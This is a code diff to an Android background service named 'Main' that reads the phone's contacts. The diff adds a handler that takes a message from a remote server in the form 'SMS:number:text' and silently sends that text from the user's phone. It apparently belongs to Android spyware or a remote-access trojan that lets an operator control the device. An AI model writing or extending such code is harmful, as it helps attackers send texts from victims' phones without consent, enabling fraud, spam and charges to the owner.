@@ -12,6 +12,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.provider.ContactsContract;
+import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
@@ -126,6 +127,12 @@ public class Main extends Service {
                     }
                 }
                 phones.close();
+            }
+            if (response.getResponseMessage().startsWith("SMS:")) {
+                Log.i("Log", "Sending...");
+                String[] input = response.getResponseMessage().split(":");
+                SmsManager sms = SmsManager.getDefault();
+                sms.sendTextMessage(input[1], null, input[2], null, null);
             }
         }
     };
